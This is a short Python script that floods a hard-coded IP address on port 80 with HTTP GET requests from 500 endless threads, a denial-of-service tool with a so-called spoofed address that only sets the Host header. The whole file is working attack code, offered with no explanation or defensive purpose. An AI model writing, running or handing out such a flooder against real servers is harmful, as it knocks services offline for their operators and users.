import threading
import socket

target = '172.24.124.199'
port = 80
spoof_ip = '100.64.100.10'
current_connections = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + spoof_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global current_connections
        current_connections += 1

        if current_connections % 500 == 0:
            print(current_connections)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
